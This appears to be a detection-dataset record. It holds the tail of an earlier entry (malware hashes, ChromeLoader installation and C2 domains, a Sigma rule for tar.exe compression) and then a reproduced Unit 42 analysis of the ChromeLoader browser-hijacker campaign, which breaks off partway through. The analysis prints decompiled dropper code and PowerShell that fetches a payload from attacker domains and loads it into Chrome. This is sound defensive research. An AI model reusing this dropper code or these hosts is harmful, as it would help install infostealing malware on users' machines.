de47867694d3d7acb93c83237d2418271f1020fe943760c026\n23f30fa4e9fe3580898be54f8762f85d5098fd526a51183c457b44822446c25a\n276f4008ce6dcf867f3325c6b002950cbd0fdb5bf12dc3d3afb1374622820a4e\n309c87b34966daecd05c48b787c3094eeed85b5f23ec93b20fc9cdbf8ff9b586\n47c65ef4d6b0ffe7109c588e04575dcf05fdf3afe5796078b4f335cb94c438b7\n502a8d1e95c21b5dc283ef4877ca2fe2ba41570bd813c47527fca2fb224d5380\n5e6b5a9c0849db8ca0696a16c882d6945a62e419bd646f23d4d00533bbe9bca5\n6e0cb7518874437bac717ba1888991cee48dfaca4c80a4cbbbe013a5fe7b01a6\n83cf9d2244fa1fa2a35aee07093419ecc4c484bb398482eec061bcbfbf1f7fea\n87f0416410ac5da6fd865c3398c3d9012e5488583b39edacd37f89bc9469d6a9\nc6a68fac895c0b15d5cbbba63f208e5b0a6f3c1d2382b9465375d1794f447ac5\nc7aedc8895e0b306c3a287995e071d7ff2aa09b6dac42b1f8e23a8f93eee8c7a\nd374ef30aa17f8bad0fb88d0da47f4038669c340d4c7fc2ff6505b07c17fdf65\ndfc90f64139b050cf3c72d833e1a7915af1bd689ece7222b9ac2c8426a0bfd0a\n9a5be852afef127b5cbe3af23ef49055677b07bcaca1735cf4ad0ff1e8295ccb\n7ba5e623ad2e09896f0e1d1167758bcf22a9092e4a65856f825a2b8740e748f6\nedb21b3f6f52ab0d0e17aca7e658a6e3f9ce98002433810612562b8e6ab41920\n0cf40fbce8a48bfc5068ac24ec1dd1f828af31fe3cff0342003d12b0ea561dcf\n4a0ababa34024691dc1a9e6b050fe1e5629220af09875998917b1a79af4e2244\n52c7bb3efafdd8f16af3f75ca7e6308b96e19ef462d5d4083297da1717db8b07\nbcac3fee6182a64764e88b4ed4f78cc071f297c501746df6473b0e9e679b3b43\naa9b742267bba71507a644ea4ee52a0f118ee6d595bd7eac816a8e8ee0246427\n55f240467cf2c0891484d97ded9e0c53b259a88814b6f1c78a8961bda58c9377\n49006f7529453966d6796040bb1c0ab2d53a1337c039afe32aaa14a8cce4bf0e\n08de8a1103ccd7980a9900e2ceccdef0fe4db6bd06184eb628bfbcf76a7ff997\n2eb1056cc176747c1be4b115be90cc7ee26da11a597cff6631da54c517d1a15c\n436dde0fb44f95371832a55e56ed9ee9cb22f5323ce0d2a4cdcd61cbab713503\nc05dbec1aaa11703195c743433a4319d49180c7fbd9a962e162cacd6b605ddd9\nb919fbd354654a7bf99db7206adf6a5fba9ce73ee3fedb6d08ed932ee527f301\nbfead4ccc3c16dee5f205b78e12aaaa2b33bdedbc57e22a4dbc48724f13f6277\neddd3ce6d39909be6fd5a093c2798a0c9113769b8f0f24a038449b409232472a\n22f4a87053769ae21efa8945a83e46df2f56e8f01a66f156cacf5ef6b6a8262a\na3631d6012b72a63b0f1b4a013d0971ea8505ee3db32d4a0b7b31cb9ba8dd309\n1ad535854fe536fd17aa56ae82f74872d6fad18545e19950afa3863bcbcf34eb\n9d46a0509291bf3365771f6ad53e213ffb58e4926f11365687f4a11fd0f03855\n```\n\n### C2 and Installation Servers\n\n#### Installation Servers\n\n```\nbrokenna[.]work\netterismype[.]co\nidwhitdoe[.]work\nithconsukultin[.]com\nlearnataloukt[.]xyz\nrsonalrecom[.]co\nyflexibilituky[.]co\nyeconnected[.]com\nableawid[.]com\nairplanegoobly[.]com\nbaganmalan[.]com\nballjoobly[.]com\nbalokyalokd[.]com\nboogilooki[.]com\nbookimooki[.]com\ncarfunusme[.]com\ncarmoobly[.]com\nchairtookli[.]com\nchookiebooki[.]com\nchoopinookie[.]com\nckgrounda[.]com\ncomputermookili[.]com\ndubifunme[.]com\ndudesurfbeachfun[.]com\nexkcellent[.]com\nfunbeachdude[.]com\nketobepar[.]com\nkooblniplay[.]com\nletfunhapeme[.]com\nlookiroobi[.]com\nlookitoogi[.]com\nmadorjabl[.]com\nmalanbagam[.]com\nmokkilooki[.]com\nmyeducatio[.]com\nnakasulba[.]com\nndinterper[.]com\nndworldwi[.]com\nnookiespooti[.]com\noempafnyfi[.]com\nsaveifmad[.]com\nsiwoulukdli[.]com\nslootni[.]com\nsonalskills[.]com\ntabletoobly[.]com\ntoogimoogi[.]com\ntoukfarep[.]com\nuiremukent[.]com\nukrawinrusyes[.]com\nutfeablea[.]com\nvoobmijump[.]com\nxoomitsleep[.]com\nyalfnbagan[.]com\nyalokmalos2[.]com\nyescoolservmate[.]com\nyourretyeq[.]com\ntcaukthw[.]com\ntooblycars[.]com\nkoooblycar[.]com\nrooblimyooki[.]com\nyooblygoobnku[.]com\nplaykooblni[.]com\nrockslootni[.]com\nmuendakere[.]xyz\nmployeesihigh[.]xyz\nadiingsinsp[.]xyz\najorinryeso[.]xyz\nktyouexpec[.]xyz\nlearnataloukt[.]xyz\nngwitheaam[.]xyz\nptonnervent[.]xyz\nukmlasttyye[.]xyz\nukseseem[.]xyz\nwithyourret[.]xyz\n```\n\n#### C2s\n\n```\nbetasymbolic[.]com\nkrestinaful[.]com\ntobepartou[.]com\ntobedirectuke[.]com\neandworldw[.]com\netobepartou[.]com\nkfareputfeabl[.]com\nblesasmetot[.]com\nsiwoulukdlik[.]com\nsforourcompa[.]com\n```",
    "sigma_rule": {
      "title": "Compressed File Creation Via Tar.EXE",
      "id": "418a3163-3247-4b7b-9933-dcfcb7c52ea9",
      "status": "test",
      "description": "Detects execution of \"tar.exe\" in order to create a compressed file.\nAdversaries may abuse various utilities to compress or encrypt data before exfiltration.\n",
      "references": [
        "https://unit42.paloaltonetworks.com/chromeloader-malware/",
        "https://lolbas-project.github.io/lolbas/Binaries/Tar/",
        "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/cicada-apt10-japan-espionage"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems), AdmU3",
      "date": "2023-12-19",
      "tags": [
        "attack.collection",
        "attack.exfiltration",
        "attack.t1560",
        "attack.t1560.001"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\tar.exe"
          },
          {
            "OriginalFileName": "bsdtar"
          }
        ],
        "selection_create": {
          "CommandLine|contains": [
            "-c",
            "-r",
            "-u"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Likely"
      ],
      "level": "low"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_tar_compression.yml",
    "id": "598"
  },
  {
    "url": "https://unit42.paloaltonetworks.com/chromeloader-malware/",
    "markdown": "# ChromeLoader: New Stubborn Malware Campaign\n\n**Malware**\n\n### Related Products\n\n- Advanced WildFire\n- Cortex XDR\n\n**Published:** July 12, 2022\n**Categories:** Malware, Threat Research\n**Tags:** Adware, Browser hijacker, Choziosi Loader, ChromeBack, ChromeLoader, Infostealer, Malvertising\n\n---\n\n## Executive Summary\n\nIn January 2022, a new browser hijacker/adware campaign named ChromeLoader (also known as Choziosi Loader and ChromeBack) was discovered. Despite using simple malicious advertisements, the malware became widespread, potentially leaking data from thousands of users and organizations.\n\nInstead of more traditional malware like a Windows executable (`.exe`) or Dynamic Link Library (`.dll`), the malware authors used a browser extension as their final payload. The browser extension serves as adware and an infostealer, leaking all of the user’s search engine queries. We discovered significant changes and additions of capabilities throughout this campaign's evolution, and we predict further changes as this campaign continues.\n\nIn this article, we examine the technical details of this malware, focus on the evolution between its different versions and describe changes in its infection process. This article also reviews new variants that have not yet been publicly reported.\n\nPalo Alto Networks customers using Cortex XDR and WildFire receive protections against this newly discovered malware out of the box.\n\n| **Names for malware discussed** | **ChromeLoader, Choziosi Loader, ChromeBack** |\n|---------------------------------|-----------------------------------------------|\n\n---\n\n## Introduction to ChromeLoader Malware\n\nChromeLoader is a multi-stage malware family. Each variant contains different stages throughout its infection chain, but the infection chain often looks quite similar among the different variants, including malicious browser extensions used in all variants.\n\nThe different payload extensions we tracked had a hardcoded version added by the attacker. This labeling routine contributed to the research process, linking the different versions to the same campaign – and by their correct chronological order.\n\nThe various extension versions are related to different variants of this malware. We differentiate the variants not only by the related extension version but also by the techniques used throughout their infection chain and the targeted operating systems.\n\nThe different variants are mentioned in this article by their detection order and referenced throughout this document as follows:\n\n- **Variant 0:** Named that way since it was active before Variant 1 (the first variant that was discovered in the wild). It used AutoHotKey (AHK)-compiled executables and version 1.0 of the Chrome extension. Its first known attack occurred in December. In this article, this variant is discussed fourth (in the section titled “The Real First Windows Variant”).\n- **Variant 1:** Mentioned first (beginning in the “Infection Vector” section). It used versions 2.0-4.4 of the Chrome extension as its payload and a DotNet executable that launches obfuscated PowerShell as its dropper. It was mainly active in January.\n- **Variant 2:** Mentioned third (see the section “Second Windows Variant”). It uses the 6.0 version of the Chrome extension and uses an obfuscated executable as its initial dropper. It has been active since March.\n- **MacOS Variant:** Mentioned second (see the section “MacOS Variant”). This variant focuses on MacOS computers (while other variants target Windows users only). Uses the 6.0 version of the extension. Active since March.\n\n```image\nAlt: The infection chain of the different variants.\nDescription: The image illustrates the infection chain of the ChromeLoader malware variants. It features a flowchart with labeled nodes, starting from a malicious ad or tweet leading to a downloaded file (in DMG or ISO format). This file is associated with a dropper, which subsequently executes an AHK script file. The flow continues to an EXE file connected to a scheduled task, branching off to shell script (SH) and PowerShell (PS) files before culminating in the installation of a Chrome extension (CRX file). The visual structure effectively conveys the multi-stage nature of the malware's infection process.\nTranscription: |\n  Malicious ad or tweet\n          ↓\n   Downloaded file\n          ↓\n    ┌───────────┐\n    │   .ISO    │\n    └───────────┘\n          ↓\n    ┌────────────┐\n    │    .EXE    │\n    └────────────┘\n          ↓\n    Scheduled task\n          ↓\n    ┌────────────┐\n    │    .SH     │\n    └────────────┘\n          ↓\n    ┌────────────┐\n    │    .PS     │\n    └────────────┘\n          ↓\n    ┌────────────┐\n    │    .CRX    │\n    └────────────┘\n          ↓\n    Chrome extension\n```\n\n*Figure 1. The infection chain of the different variants.*\n\n---\n\n## Infection Vector (Variant 1)\n\nThe first variant of ChromeLoader Malware (referred to in the Introduction as Variant 1) was first seen in January 2022.\n\nThe chain of events starts when a user is enticed to download a torrent or a cracked video game through malvertising campaigns on ad sites and social media platforms. The user scans a QR code on these web pages and is redirected to a compromised website that presents an ISO image (an optical disc image file, typically used with CD/DVD). The user downloads the ISO image, mounts it by double-clicking and executes content contained in the mounted ISO image.\n\n*Figure 2. An example of a QR code posted on Twitter.*\n\n```image\nAlt: An example of a download link to the malicious ISO image from the QR code.\nDescription: The image displays a webpage offering a free download of a file titled 'Five Nights at Freddy’s Security Breach'. The page includes a clear 'Download' button and mentions that clicking the button will prompt the user to install a program called SevenZip, which is used for unpacking files. Additionally, the URL at the bottom shows that the file is hosted on an Amazon server, indicating potential malicious content associated with the download.\nTranscription: |\n  FREE\n  File: Five.Nights.at.Freddys.Security.Breach.zip\n  Download Now\n  \n  By clicking the button below you will be prompted to install SevenZip. It is a free application and will allow you to Unpack and use manage your downloads.\n  \n  [Download] [Step 1]\n  \n  https://s3.us-east-2.amazonaws.com/medmixmega/j149/File-Five.Nights.at.Freddys.Security.Breach.zip?utm_source=partner_consent\n```\n\n*Figure 3. An example of a download link to the malicious ISO image from the QR code.*\n\n---\n\n## Deployment\n\nThe downloaded ISO image contains the following:\n\n- **`Microsoft.Win32.TaskScheduler.dll`:** a legitimate .NET DLL signed by Microsoft, used by other .NET programs for integrating with the scheduled tasks mechanism.\n- **Language folders:** contains a resource file used by the mentioned DLL.\n- **`CS_installer.exe` and its config file:** malicious executable written by the malware authors (note that the name might change from one version to another). In some versions, the authors (probably accidentally) left its PDB file, containing its debug data, inside this folder as well.\n- **`_meta.txt`:** a text file found in advanced versions of this malware, containing scrambled ASCII letters.\n\nMost files in this directory are hidden, and the ordinary user will not notice them when opening this directory using Windows File Explorer. The only non-hidden file is `CS_installer.exe`, which tempts the victim to double-click it to complete the software installation download.\n\n```image\nAlt: An example of a mounted malicious ISO image (after selecting “show hidden files”).\nDescription: The image displays a file directory structure of a mounted malicious ISO image. It includes several folders named after different languages (e.g., 'de', 'es', 'fr', etc.) and files such as 'CS_installer.exe', 'CS_installer.exe.config', 'Microsoft.Win32.TaskScheduler.dll', and '_meta.txt'. The 'CS_installer.exe' file is highlighted as the main executable associated with the malware, while 'Microsoft.Win32.TaskScheduler.dll' is a legitimate DLL file. The presence of hidden files and the layout suggest it is designed to mislead users into executing the malicious installer.\nTranscription: |\n  Name                                   Date modified      Type                    Size\n  de                                     1/8/2022 2:08 PM   File folder             -\n  es                                     1/8/2022 2:08 PM   File folder             -\n  fr                                     1/8/2022 2:08 PM   File folder             -\n  it                                     1/8/2022 2:08 PM   File folder             -\n  pl                                     1/8/2022 2:08 PM   File folder             -\n  ru                                     1/8/2022 2:08 PM   File folder             -\n  zh-CN                                  1/8/2022 2:08 PM   File folder             -\n  _meta.txt                              1/11/2022 6:26 PM  Text Document           6 KB\n  CS_installer.exe                       1/10/2022 2:09 PM  Application             50 KB\n  CS_installer.exe.config                1/7/2022 3:58 PM   CONFIG File             1 KB\n  CS_installer.pdb                       1/10/2022 2:09 PM  PDB File                24 KB\n  Microsoft.Win32.TaskScheduler.dll      1/8/2022 2:08 PM   Application extension   326 KB\n```\n\n*Figure 4. An example of a mounted malicious ISO image (after selecting “show hidden files”).*\n\nThe victim launches `CS_installer.exe` by double-clicking it. In most cases, the executable presents the message shown below in Figure 5, indicating that the program failed to execute. However, this is an attempt by the authors to mislead their targets.\n\n```image\nAlt: Message box presented by the dropper, designed to deceive the user.\nDescription: The image displays a Windows message box indicating an error during the installation process, with the text 'Install Error, incompatible system'. The box has two buttons: 'Retry' and 'Cancel', suggesting that the user is prompted to either attempt the installation again or to exit the process. This message is part of a malicious software campaign, designed to deceive users into thinking there is a legitimate installation error.\nTranscription: |\n  Error\n  Install Error, incompatible system\n  \n  [Retry] [Cancel]\n```\n\n*Figure 5. Message box presented by the dropper, designed to deceive the user.*\n\nThe executable is a non-obfuscated program written in .NET, so .NET reflectors can decompile it to read the source code. The code shown in Figure 6 is revealed when the executable is loaded into a reflector. This code creates a scheduled task configured to execute a malicious base64 encoded PowerShell command every ten minutes. The task name is constructed from the `Chrome` string concatenated with a random suffix from the `namesDict` array.\n\n```image\nAlt: An example of decompiled CS_installer.exe source code.\nDescription: The image displays a section of source code written in C#. It illustrates the main method of a program likely related to malware behavior. Key functionalities highlighted in the code include checking for an existing malicious scheduled task, opening a message box to indicate an error, and creating a new task named 'Chrome'. The code suggests that it utilizes Windows Task Scheduler to execute a PowerShell command at regular intervals while obscuring its execution from the user.\nTranscription: |\n  private static void Main(string[] args)\n  {\n      if (Program.MessageBox((IntPtr)0, \"Install Error, incompatible system\", \"Error\", 5) == 99)\n      {\n          Environment.Exit(0);\n      }\n      using (TaskService ts = new TaskService())\n      {\n          using (IEnumerator<Task> enumerator = TaskService.AllTasks.GetEnumerator())\n          {\n              while (enumerator.MoveNext())\n              {\n                  if (enumerator.Current.Definition.Actions[0].ToString().Contains(\"powershell -ExecutionPolicy Bypass -WindowStyle Hidden -E\"))\n                  {\n                      Environment.Exit(0);\n                  }\n              }\n          }\n      }\n      TaskDefinition td = ts.NewTask();\n      td.RegistrationInfo.Description = \"Example task\";\n      td.Triggers.Add(new TimeTrigger(DateTime.Now.AddMinutes(1.0))\n      {\n          Repetition = new RepetitionPattern(TimeSpan.FromMinutes(10.0), TimeSpan.Zero, false)\n      });\n      string script = Program.deScramble();\n      td.Actions.Add(new ExecAction(\"cmd\", \"/c start /min \\\"\\\" powershell -ExecutionPolicy Bypass -WindowStyle Hidden -E \" + script, null));\n      string[] namesDict = new string[]\n      {\n          \"Loader\",\n          \"Monitor\",\n          \"Checker\",\n          \"Conf\",\n          \"Task\",\n          \"Updater\"\n      };\n      int nameIndex = new Random().Next(namesDict.Length);\n      string taskName = \"Chrome\" + namesDict[nameIndex];\n      ts.RootFolder.RegisterTaskDefinition(taskName, td);\n  }\n```\n\n*Figure 6. An example of decompiled CS_installer.exe source code.*\n\nThe script content derives from the `_meta.txt` file, unscrambled by the following predefined function below in Figure 7, which applies simple character replacement.\n\n```image\nAlt: An example of the unscramble function.\nDescription: The image displays a snippet of C# source code showing a decryption or unscrambling function. The code iterates through the characters of a text file named '_meta.txt', checking if each character exists in a dictionary called 'replaceDict'. If a match is found, the character is replaced; otherwise, it is appended to the result as is. The returning variable 'res' accumulates the final unscrambled string.\nTranscription: |\n  {\n      'k',\n      'Z'\n  },\n  {\n      '4',\n      '='\n  };\n  foreach (char c in File.ReadAllText(\"_meta.txt\"))\n  {\n      if (replaceDict.ContainsKey(c))\n      {\n          res += replaceDict[c].ToString();\n      }\n      else\n      {\n          res += c.ToString();\n      }\n  }\n  return res;\n```\n\n*Figure 7. An example of the unscramble function.*\n\nSome of the features mentioned were missing in earlier versions of this variant of the malware. For instance, in the version shown in Figure 8, which was discovered only one week before the version mentioned in Figures 6 and 7, the authors did not use a descramble function but simply hardcoded the encoded PowerShell script in the .NET executable and used the predefined `ChromeLoader` name for their task instead of generating a more randomized suffix.\n\n```image\nAlt: An example of source code from an older version of Variant 1.\nDescription: The image depicts a snippet of C# code from a decompiled .NET executable associated with the ChromeLoader malware. The code contains a method that appears to handle task scheduling using the Windows Task Scheduler. It includes checks for specific conditions related to the PowerShell execution policy and sets up a scheduled task to execute a base64 encoded PowerShell script every ten minutes. The script variable at the end contains a long string of encoded data, likely representing the malicious actions to be performed.\nTranscription: |\n  private static void Main(string[] args)\n  {\n      if (Program.MessageBox((IntPtr)0, \"Install Error, incompatible system\", \"Error\", 5) == 99)\n          Environment.Exit(0);\n  \n      using (TaskService ts = new TaskService())\n      {\n          using (IEnumerator<Task> enumerator = ts.AllTasks.GetEnumerator())\n          {\n              while (enumerator.MoveNext())\n              {\n                  if (enumerator.Current.Definition.Actions[0].ToString().Contains(\"powershell -ExecutionPolicy Bypass -WindowStyle Hidden -E\"))\n                  {\n                      Environment.Exit(0);\n                  }\n              }\n              TaskDefinition td = ts.NewTask();\n              td.RegistrationInfo.Description = \"Example task\";\n              td.Triggers.Add(new TimeTrigger(DateTime.Now.AddMinutes(1.0)));\n              RepetitionPattern repetition = new RepetitionPattern(TimeSpan.FromMinutes(10.0), TimeSpan.Zero, false);\n              string script = \"JAIBgAdABgAEdABoACAApAgAIAAAoACQBAgAIAAAoACQBAgAIAAAoACQBAgAIAAAoACQBAgAIAAAoACQBAgAIAAAoACQBAgAIA...\n```\n\n*Figure 8. An example of source code from an older version of Variant 1.*\n\nThe attacker uses the encoded PowerShell script for downloading and loading a malicious browser extension into the user’s Chrome browser.\n\n```image\nAlt: An example of variable definition in the PowerShell dropper.\nDescription: The image displays a snippet of PowerShell code, showing variable definitions related to the `ChromeLoader` malware campaign. The variables include paths to the Chrome extension directory, configuration file, a ZIP archive, a task name, and a domain. The code suggests the malware's operational parameters, indicating where the malicious components are stored and pointing to the domain associated with the attack.\nTranscription: |\n  $extPath = \"$($env:LOCALAPPDATA)\\chrome\"\n  $confPath = \"$extPath\\conf.js\"\n  $archiveName = \"$($env:LOCALAPPDATA)\\archive.zip\"\n  $taskName = \"ChromeLoader\"\n  $domain = \"etterismype.co\"\n```\n\n*Figure 9. An example of variable definition in the PowerShell dropper.*\n\n```image\nAlt: An example of a payload download attempt.\nDescription: The image shows a portion of PowerShell code used within a malware campaign. It includes conditional statements that check for specific variables (`$dd` and `$ver`). The code attempts to unregister a scheduled task if a connection is successfully established and removes certain files. Additionally, it tries to download an archive file from a specified domain and then extracts its contents if the download is successful. Comments in the image explain the functionality of key sections of code.\nTranscription: |\n  if ($dd -and $ver){\n      try{\n          $un = wget \"https://$domain/un?did=$dd&ver=$ver\"\n          if($un -Match \"$dd\"){\n              Unregister-ScheduledTask -TaskName \"$taskName\" -Confirm:$false\n              Remove-Item -path \"$extPath\" -Force -Recurse\n          }\n      }catch{}\n      try{\n          wget \"https://$domain/archive.zip?did=$dd&ver=$ver\" -outfile \"$archiveName\"\n      }catch{}\n      if (Test-Path -Path \"$archiveName\"){\n          Expand-Archive -LiteralPath \"$archiveName\" -DestinationPath \"$extPath\" -Force\n          Remove-Item -path \"$archiveName\" -Force\n      }\n  }\n```\n\n*Figure 10. An example of a payload download attempt.*\n\n```image\nAlt: An attempt to load the payload into the user’s browser.\nDescription: The image displays a section of PowerShell code that attempts to manage Chrome processes. It includes commands to retrieve any running Chrome processes and close their main windows, followed by a command to restart Chrome with specific arguments for loading an extension from a provided path. The code is formatted in a programming style, emphasizing its technical nature, and is likely part of a malware analysis discussion.\nTranscription: |\n  try{\n      Get-Process chrome | ForEach-Object { $_.CloseMainWindow() | Out-Null }\n      Start-Process -FilePath $chromePath -ArgumentList --load-extension=\"$extPath\", --restore-last-session, --noerrdialogs, --disable-session-crashed-bubble\n  }\n  catch{\n  }\n```\n\n*Figure 11. An attempt to load the payload into the user’s browser.*\n\nThe evolution from early versions of this malware to later ones is also seen in the encoded PowerShell script. Figure 12 shows PowerShell script executed by an earlier version of this variant, which is significantly shorter and contains less complicated code.\n\n```image\nAlt: An example of an older version of this PowerShell dropper.\nDescription: The image depicts a snippet of PowerShell code related to malware activity. It shows a script that checks for the existence of a specific directory in the user's local app data and, if not found, attempts to download a zip archive from a specified URL. The script then expands the downloaded archive into the directory. It also includes logic to check if the Chrome browser is running and, if not, starts it while loading a specific extension from the downloaded content. The syntax and structure indicate that this script is designed to manipulate and control the browser environment as part of a malicious operation.\nTranscription: |\n  $extPath = \"$($env:LOCALAPPDATA)\\chrome\"\n  if(-not(Test-Path -Path $extPath)){\n      $archiveName = \"$($env:LOCALAPPDATA)\\archive.zip\"\n      try{\n          wget \"https://brokenna.work/archive.zip\" -outfile \"$archiveName\"\n      }catch{\n          break\n      }\n      Expand-Archive -LiteralPath \"$archiveName\" -DestinationPath \"$extPath\"\n  }\n  \n  $chromeProc = \"\"\n  try{\n      $chromeProc = (Get-WmiObject Win32_Process -Filter \"name='chrome.exe'\")[0] | Select-Object CommandLine\n      if(-not($chromeProc -Match \"load-extension\")){\n          Get-Process chrome | ForEach-Object { $_.CloseMainWindow() | Out-Null}\n          start chrome --load-extension=\"$extPath\", --restore-last-session\n          break\n      }\n  }catch{}\n```\n\n*Figure 12. An example of an older version of this PowerShell dropper.*\n\n---\n\n## Dropper Statistics\n\nChromeLoader attacks on Palo Alto Networks Cortex XDR customers were blocked by our Behavioral Threat Protection module starting from the first day of this campaign. However, we were curious about the following stages of this attack. Consequently, we decided to continue our research, tracking down the attacker’s footprints and intentions.\n\nThe scheduled task is using the malware to download a malicious Chrome extension and installing it to the victim’s browser. The URL hosting the Chrome extension is hardcoded in the obfuscated PowerShell command and changes between the different versions.\n\n   ```image\n   Alt: First infection attempt for installation servers.\n   Description: The image is a table displaying the installation servers used in a malware campaign, specifically ChromeLoader. It contains two columns: 'Installation Server' and 'First Connection Attempt.' Each row lists a different installation server along with the date of its first connection attempt, providing a clear overview of the timing and nature of these malicious activities.\n   Transcription: |\n     | Installation Server  | First Connection Attempt |\n     |----------------------|--------------------------|\n     | brokkena[.]work      | 2022-01-03               |\n     | learnataloukt[.]xyz  | 2022-01-06               |\n     | yflexibilityuky[.]co | 2022-01-08               |\n     | rsonalrecom[.]co     | 2022-01-11               |\n     | etterismype[.]co     | 2022-01-11               |\n     | idwhitdoe[.]work     | 2022-01-12               |\n     | ilsandothe[.]work    | 2022-01-12               |\n     | ithconsukultin[.]com | 2022-01-12               |\n     | eadirtlseiv[.]work   | 2022-01-12               |\n     | roosson ech[.]work   | 2022-01-12               |\n     | yeconnected[.]com    | 2022-01-13               |\n   ```\n\n*Figure 13. First infection attempt for installation servers.*\n\n```image\nAlt: Installation server connection attempts distribution.\nDescription: The image is a pie chart displaying the distribution of installation server connection attempts for ChromeLoader malware. Different segments represent various domains used in the attacks, with percentages indicating the proportion of connection attempts associated with each domain. The largest segment is labeled 'yflexibilityuk[.]co' at 38.5%, followed by 'brokenna[.]work' at 15.4%, and several other domains with smaller percentages.\nTranscription: |\n  yflexibilituky[.]co     38.5%\n  brokenna[.]work         15.4%\n  learnataloukt[.]        12.3%\n  etterismype[.]co        10.8%\n  ithconsukltin[.]        7.7%\n  rsonalrecom[.]co        3.1%\n  idwhitdoe[.]work        4.6%\n  yeconnected[.]          3.1%\n  ilsandothe[.]work       1.5%\n```\n\n*Figure 14. Installation server connection attempts distribution.*\n\n```image\nAlt: Blocked infections per region.\nDescription: The image is a bar chart illustrating the distribution of blocked infections from a malware campaign across different regions. The x-axis represents geographical areas labeled as 'US', 'EU', and 'CA', while the y-axis indicates the number of blocked infections. The chart shows a significant spike in blocked infections in the US (56), with lower counts in the EU (8) and CA (1), highlighting the regional impact of the malware activity.\nTranscription: |\n  Blocked infections per region:\n  \n  | Region | Blocked Infections |\n  |--------|--------------------|\n  | US     | 56                 |\n  | EU     | 8                  |\n  | CA     | 1                  |\n```\n\n*Figure 15. Blocked infections per region.*\n\n```image\nAlt: Infection attempts per day per installation server during the Variant 1’s most active time.\nDescription: The image is a bar chart illustrating the number of infection attempts per day for various installation servers during a malware campaign. The x-axis represents dates from January 3 to February 16, while the y-axis indicates the count of infection attempts. Different colored bars represent distinct installation servers, highlighting peaks of activity on certain dates, particularly January 9 and January 13, with most servers showing limited attempts on other days.\nTranscription: |\n  | Date  | roossonech[.]work | ilsandothe[.]work | idwhitdoe[.]work | eadirtlseiv[.]work | rsonalrecom[.]co | etterismype[.]co | yflexibilituky[.]co | learnataloukt[.]xyz | brokenna[.]work | yeconnected[.]com | ithconsukultin[.]com |\n  |-------|-------------------|-------------------|------------------|--------------------|------------------|------------------|---------------------|---------------------|-----------------|-------------------|----------------------|\n  | 01-03 | 1                 | 0                 | 0                | 0                  | 0                | 0                | 0                   | 0                   | 0               | 0                 | 0                    |\n  | 01-05 | 0                 | 0                 | 0                | 0                  | 0                | 0                | 0                   | 0                   | 0               | 0                 | 0                    |\n  | 01-07 | 1                 | 1                 | 0                | 0                  | 0                | 0                | 0                   | 0                   | 0               | 0                 | 0                    |\n  | 01-09 | 8                 | 1                 | 0                | 0                  | 0                | 0                | 0                   | 0                   | 0               | 0                 | 0                    |\n  | 01-11 | 2                 | 0                 | 0                | 0                  | 0                | 0                | 0                   | 0                   | 0               | 0                 | 0                    |\n  | 01-13 | 3                 | 0                 | 0                | 0                  | 0                | 0                | 0                   | 0                   | 0               | 0                 | 0                    |\n  | 01-15 | 0                 | 0                 | 0                | 0                  | 0                | 0                | 0                   | 0                   | 0               | 0                 | 0                    |\n  | 01-17 | 0                 | 0                 | 0                | 0                  | 0                | 0                | 0                   | 0                   | 0               | 0                 | 0                    |\n  | 01-19 | 0                 | 0                 | 0                | 0                  | 0                | 0                | 0                   | 0                   | 0               | 0                 | 0                    |\n  | 01-21 | 0                 | 0                 | 0                | 0                  | 0                | 0                | 0                   | 0                   | 0               | 0                 | 0                    |\n  | 01-23 | 0                 | 0                 | 0                | 0                  | 0                | 0                | 0                   | 0                   | 0               | 0                 | 0                    |\n  | 01-25 | 0                 | 0                 | 0                | 0                  | 0                | 0                | 0                   | 0                   | 0               | 0                 | 0                    |\n  | 01-27 | 0                 | 0                 | 0                | 0                  | 0                | 0                | 0                   | 0                   | 0               | 0                 | 0                    |\n  | 01-29 | 0                 | 0                 | 0                | 0                  | 0                | 0                | 0                   | 0                   | 0               | 0                 | 0                    |\n  | 01-31 | 0                 | 0                 | 0                | 0                  | 0                | 0                | 0                   | 0                   | 0               | 0                 | 0                    |\n  | 02-02 | 0                 | 0                 | 0                | 0                  | 0                | 0                | 0                   | 0                   | 0               | 0                 | 0                    |\n  | 02-04 | 0                 | 0                 | 0                | 0                  | 0                | 0                | 0                   | 0                   | 0               | 0                 | 0                    |\n  | 02-06 | 0                 | 0                 | 0                | 0                  | 0                | 0                | 0                   | 0                   | 0               | 0                 | 0                    |\n  | 02-08 | 0                 | 0                 | 0                | 0                  | 0                | 0                | 0                   | 0                   | 0               | 0                 | 0                    |\n  | 02-10 | 0                 | 0                 | 0                | 0                  | 0                | 0                | 0                   | 0                   | 0               | 0                 | 0                    |\n  | 02-12 | 0                 | 0                 | 0                | 0                  | 0                | 0                | 0                   | 0                   | 0               | 0                 | 0                    |\n  | 02-14 | 0                 | 0                 | 0                | 0                  | 0                | 0                | 0                   | 0                   | 0               | 0                 | 0                    |\n  | 02-16 | 0                 | 0                 | 0                | 0                  | 0                | 0                | 0                   | 0                   | 0               | 0                 | 0                    |\n```\n\n*Figure 16. Infection attempts per day per installation server during the Variant 1’s most active time.*\n\n---\n\n## Payload\n\nThe payload of the malware is a Chrome extension – every downloadable extension has the same format:\n\n```image\nAlt: An example of the downloaded extension files.\nDescription: The image displays a file directory structure showing various files associated with a malware Chrome extension. It includes four files: 'background.js', 'conf.js', 'manifest.json', and 'settings.png', along with details such as the date modified, file type, and file size for each. This layout suggests the components of the malware payload, emphasizing its organizational structure, with the JavaScript files likely containing the malicious code.\nTranscription: |\n  Name                Date modified     Type                Size\n  background.js       1/6/2022 10:39    JavaScript File     13 KB\n  conf.js             1/6/2022 10:39    JavaScript File     1 KB\n  manifest.json       1/6/2022 10:39    JSON File           1 KB\n  settings.png        1/6/2022 10:39    PNG File            4 KB\n```\n\n*Figure 17. An example of the downloaded extension files.*\n\nUsing some definitions in the `manifest` file, and using a known legitimate picture, the extension claims to be legitimate and harmless. However, the extension asks for elevated privileges. Requested privileges include accessing browser data, manipulating web requests and accessing every possible URL address, which legitimate browser extensions would not do.\n\n```image\nAlt: An example of a downloaded extension’s manifest file.\nDescription: The image displays a snippet of a `manifest.json` file used for a Chrome extension. It shows the structure of the file, including fields such as `name`, `version`, `description`, and `permissions`. Key highlights are boxed in red, indicating that the extension pretends to be legitimate by changing its name and description to 'Settings' and that it requests 